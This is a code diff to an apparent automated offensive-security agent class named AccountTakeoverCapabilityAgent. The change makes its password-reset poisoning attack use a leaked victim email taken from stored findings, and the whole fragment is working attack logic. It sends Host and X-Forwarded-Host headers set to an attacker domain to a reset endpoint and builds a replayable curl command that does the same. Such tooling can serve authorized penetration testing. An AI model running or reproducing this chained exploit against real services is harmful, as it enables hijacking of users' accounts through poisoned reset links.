@@ -120,11 +120,18 @@ class AccountTakeoverCapabilityAgent(BaseCapabilityAgent):
                             "X-Forwarded-Host": attacker_domain,
                             "X-Original-Host": attacker_domain
                         }
-                        payload = {"email": "victim@target.com"}
+                        target_email = "victim@target.com"
+                        if context.state_store:
+                            fact = await context.state_store.get_latest_fact("leaked_user_email")
+                            if fact:
+                                target_email = fact.value
+                                logger.info(f"[{self.name}] Chaining ATO payload using leaked email: {target_email}")
+
+                        payload = {"email": target_email}
                         resp = await client.post(reset_url, json=payload, headers=poison_headers)
 
                         if resp.status_code in (200, 202) and attacker_domain in resp.text:
-                            curl_cmd = f"curl -X POST '{reset_url}' -H 'Host: {attacker_domain}' -H 'X-Forwarded-Host: {attacker_domain}' -H 'Content-Type: application/json' -d '{{\"email\": \"victim@target.com\"}}'"
+                            curl_cmd = f"curl -X POST '{reset_url}' -H 'Host: {attacker_domain}' -H 'X-Forwarded-Host: {attacker_domain}' -H 'Content-Type: application/json' -d '{{\"email\": \"{target_email}\"}}'"
                             exch_dict = {
                                 "request": {"method": "POST", "url": reset_url, "headers": poison_headers, "json_data": payload},
                                 "response": {"status_code": resp.status_code, "body_snippet": resp.text[:500]}
